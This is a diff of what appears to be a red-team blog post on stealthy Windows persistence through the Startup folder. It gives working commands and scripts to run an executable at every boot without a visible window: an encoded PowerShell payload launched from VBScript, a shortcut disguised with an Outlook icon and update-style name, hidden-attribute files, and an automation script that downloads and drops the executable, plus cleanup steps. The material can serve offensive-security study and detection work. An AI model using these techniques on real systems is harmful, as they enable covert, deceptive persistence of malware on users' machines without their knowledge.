@@ -32,21 +32,21 @@ This file can be an executable program (".exe" extension) but it can also be a B
 
 From a non-attacker perspective, it is common to see big organizations using this and other similar techniques to make all the employee laptops to launch specific programs when the Operating System (usually Windows) starts. In this case, one approach is using shortcuts to open each of these programs: Teams, Outlook, Chrome...
 
+For this specific case, we find a laptop where there are shortcuts to open some programs in the Startup folder, which open all the programs the employee needs for its daily work. However, even if the user uses Outlook everyday, there is not a shortcut for the program. Furthermore, our goal is to run a .exe file every time the user boots the computer without any cmd window popping up
+
 <br>
 
 ## Executing a EXE without a window popping up
 
-##### First fail: Powershell's window style hidden
+##### Failed approach: Powershell's window style hidden
 
-For this specific case, we find a laptop where there are shortcuts to open some programs in the Startup folder, which open all the programs the employee needs for its daily work. However, even if the user uses Outlook everyday, there is not a shortcut for the program.
-
-Furthermore, our goal is to run a .exe file every time the user boots the computer without any cmd window popping up, so first I tried to create a Batch file to execute the EXE file in the path:
+First, I created a Batch file in the path:
 
 ```
 C:\Users\USER\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UpdateOutlook.bat
 ```
 
-The content of the file executes a Powershell command which executes the program in the path "c:\temp\OutlookUpdate.exe" and hides the window (that is why we use "-windowstyle hidden"):
+And this is the content of the file, a Powershell command which executes the program in the path "c:\temp\OutlookUpdate.exe" and hides the window immediately (that is why we use "-windowstyle hidden"):
 
 ```
 powershell -windowstyle hidden -command c:\temp\OutlookUpdate.exe
@@ -54,12 +54,12 @@ powershell -windowstyle hidden -command c:\temp\OutlookUpdate.exe
 
 What is the biggest problem with this approach? Even if you run this in an good, new, optimized computer, the window will pop up even if it is for half a second. If the computer is older, the time the window appears in the screen will be longer, and having the previous Powershell command for more than 15 seconds in the user's screen is probably not the most OPSEC option. 
 
-Could we encode the Powershell command? Of course we could, but it is even better if we avoid the window appearing even for half a second.
+Could we encode the Powershell command? Of course, but it is even better if we avoid the window appearing even for half a second.
 
 
 ##### Changing Powershell for VBScript
 
-For that we will use a .VBS script, which will not pop any cmd window. For example, the following script will execute an encoded powershell command which will call "c:\ProgramData\Outlook\OutlookUpdate.exe". If we create a .VBS script with this content in the Startup folder, the program will get executed and there will be no window popping the user could ever see:
+To avoid any windows appearing in the screen, we will use a VBScript file. For example, the following script will execute an encoded powershell command which will call "c:\ProgramData\Outlook\OutlookUpdate.exe". If we create this file in the Startup folder, the program will get executed and there will be no window popping the user could ever see:
 
 ```
 Set objShell = WScript.CreateObject(""WScript.Shell"")
@@ -69,9 +69,9 @@ objShell.Run(""powershell -e YwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATwB1AHQAbAB
 
 ##### Shortcut files
 
-But, knowing the folder contains mostly shortcuts, maybe it makes more sense if the .VBS script is generated in other folder and we just leave a shortcut to it in the Startup folder. 
+But, knowing the folder contains mostly shortcuts, maybe it makes more sense if the VBScript file is generated in other folder and we just leave a shortcut to it in the Startup folder. 
 
-Furthermore, we will change the shortcut icon to a more reliable-looking one. We can do this using WScript:
+Furthermore, we will change the shortcut icon to a more reliable-looking one, and for this example we will use an Outlook icon. We can generate the file shortcut using WScript:
 
 ```
 $WshShell = New-Object -comObject WScript.Shell
@@ -84,30 +84,28 @@ $Shortcut.Save()
 
 ##### Hidden files
 
-Finally, we know we will have four files:
+Finally, now we know we will need four files:
 
 - The shortcut file in the Startup folder.
 - The icon file used by the shortcut file.
 - The VBScript file called by the shortcut.
 - The EXE file we wanted to execute in the system at startup.
 
-We will drop the icon and EXE file and generate the shortcut and VBScript file, and the four files will be on disk. 
+We will drop the icon and EXE file and generate the shortcut and the VBScript file, and the four files will be on disk. 
 
-We can use the "hidden" attribute so the files are not visible in the folder (by default, but you probably have File Explorer configured to see hidden items) or running "dir" (you should run "dir /a" to see these files). We could use:
+We can use the "hidden" attribute so the files are not visible in the folder (by default, even if you probably have File Explorer configured to see hidden items) or running "dir" (you should run "dir /a" to see these hidden files). For this we could use:
 
 ```
 attrib -h C:\ProgramData\Outlook\OutlookUpdate.exe
 ```
 
-
-It is important to notice that the shortcut file can not be "hidden", but the icon, VBScript and EXE files can.
+From my tests, it is important to notice that the shortcut file can not be "hidden", but the VBScript, EXE and even the icon file can be.
 
 <br>
 
 ## Final scripts
 
-This process is automated in the following script:
-
+This process is automated in the following [script](https://gist.github.com/ricardojoserf/d021310080ea34c8c6187d82065dde85):
 
 ```
 $Url = "http://127.0.0.1:8080"
@@ -151,7 +149,7 @@ cmd /c "dir /a ""$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Men
 ```
 
 
-And this is the script to delete the files:
+And this is the [script](https://gist.github.com/ricardojoserf/6e1a242e77a52c78b630af22d5709153) to delete the files generated for the persistence (basically you have to unset the "hidden" attribute before deleting a file, you could also delete the folder but I think it is risky to do that in a script):
 
 ```
 $Dir="C:\ProgramData\Outlook"
@@ -175,7 +173,7 @@ del "$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\S
 cmd /c "dir /a ""$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"""
 ```
 
-However, before deleting these files the program must be stopped if it is already running:
+Before deleting these files the program must be stopped if it is already running:
 
 ```
 tasklist | findstr notmalicious.exe
